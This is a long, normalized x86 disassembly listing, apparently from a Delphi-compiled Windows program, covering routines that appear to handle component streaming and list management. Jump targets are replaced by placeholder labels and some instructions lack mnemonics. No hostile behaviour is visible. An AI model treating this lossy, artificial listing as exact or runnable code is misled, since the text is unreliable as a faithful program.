mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_40599c
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_417318
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ca6a
lea eax [ ebp - 0x4 ]
call sub_40599c
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_4164a4
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_40599c
mov ecx eax
mov eax esi
pop edx
call sub_40d3e0
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_40599c
sub_41ca70
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41cb16
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cb1d
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_40405c
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_420044
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_40800c
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_41cb38
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41a1f8
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41a1f8
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41a040
sub_41cb70
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41a1f8
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41a1f8
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_41a08c
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41a040
sub_41cbb8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_41cd51
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_41a508
mov edi eax
xor edx edx
push ebp
push sub_41cd32
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cd39
mov eax [ rw-data ]
call sub_41a56c
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_41cd13
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41ccc1
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_41a19c
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_419ce8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ccc8
mov eax [ ebp - 0x8 ]
call sub_40321c
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_4166e0
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_41cb38
pop ecx
mov edx esi
mov eax edi
call sub_41a08c
mov eax ebx
call sub_40321c
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_41ca70
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_41cb70
pop ecx
inc esi
sub_41ccc8
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40321c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41a19c
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
sub_41cd60
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_41a508
mov edi eax
xor eax eax
push ebp
push sub_41cdfb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41a56c
retn
mov edx ebx
mov eax edi
call sub_41a19c
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_41a08c
mov eax esi
call sub_40321c
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_40800c
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41ce0c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_41a508
mov edi eax
xor eax eax
push ebp
push sub_41ce83
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41a56c
retn
mov edx ebx
mov eax edi
call sub_41a19c
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_41a08c
mov eax esi
call sub_40321c
sub_41ceb4
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9bc
call sub_4039a8
pop ecx
pop edx
pop ebx
retn
sub_41cef8
push ebx
push esi
push edi
call sub_4035a8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41c838
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_41cf34
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_41ee0c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_41ef1c
call sub_41cea8
sub_41cf58
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_40800c
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_403f6c
sub_41cf8c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_40800c
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ee0c
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41d04d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41d3d0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41d3d0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d054
mov eax [ ebp - 0x8 ]
call sub_40321c
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41ef1c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_41cea8
sub_41d07c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_41d09c
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_404208
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_4034a0
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_41cea8
sub_41d104
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_41a508
mov esi eax
xor edx edx
push ebp
push sub_41d174
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d17b
mov eax [ rw-data ]
call sub_41a56c
retn
mov edx ebx
mov eax esi
call sub_41a19c
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_40321c
mov edx ebx
mov eax esi
call sub_41a08c
sub_41d180
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d28f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d296
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
xor edx edx
push ebp
push sub_41d272
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d2c4
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_41c994
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_41a19c
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_404004
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_41ca70
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_41a19c
call sub_41d104
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_41a19c
mov edx eax
mov eax [ rw-data ]
call sub_41a480
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_41a290
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_41d2a0
push ebx
mov ebx eax
mov eax ebx
call sub_41d394
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41bdfc
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_41d2c4
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_40321c
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_41a19c
call sub_40321c
inc edi
dec esi
jne r-xdata
sub_41d300
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_403164
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_419830
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_4031a8
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_4198a8
mov edi eax
mov edx [ esp + 0x4 ]
call sub_4197a8
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_403180
test al al
jne r-xdata
sub_41d3d0
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_41d41c
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_41d41c
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
sub_41d46c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41d4b7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41ec6c
mov eax [ ebp - 0x4 ]
call sub_40422c
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d4be
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
call sub_41cea8
sub_41d4c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41d564
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41d068
test al al
jne r-xdata
mov eax ebx
call sub_41d068
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a9bc
jmp r-xdata
mov eax ebx
call sub_41d3ac
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_41dfd4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d56b
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_41a99c
mov esi eax
mov eax ebx
call sub_41dfcc
jmp r-xdata
mov eax ebx
call sub_41df1c
mov eax ebx
call sub_41d068
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41e138
mov eax ebx
call sub_41dfd4
sub_41d594
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_405014
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_41a040
inc esi
dec ebx
jne r-xdata
sub_41d5d0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_420160
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_405014
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4051d0
add esp 0x4
mov edx ebx
mov eax edi
call sub_420134
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_405014
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_420134
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41d648
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_405014
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_41d6b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_41d6d0
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_40281c
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41d6b0
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_41f100
call sub_40281c
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_40321c
sub_41d730
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41d816
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41f2a0
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41d7ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41d81b
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41d6d0
pop ecx
test al al
jne r-xdata
call sub_403a24
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4039d0
sub_41d840
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41d8b8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_403418
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_419ce8
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41d8bd
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41d6d0
pop ecx
test al al
jne r-xdata
call sub_403a24
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4039d0
sub_41d8e0
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41d95b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41f2a0
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_403418
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41d960
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41d6d0
pop ecx
test al al
jne r-xdata
call sub_403a24
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4039d0
sub_41d984
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41dba5
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_41ec30
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41ec30
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_41db75
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_41db33
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_41d5d0
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41d648
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_41d730
pop ecx
push ebp
call sub_41d8e0
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_41d840
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403a54
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
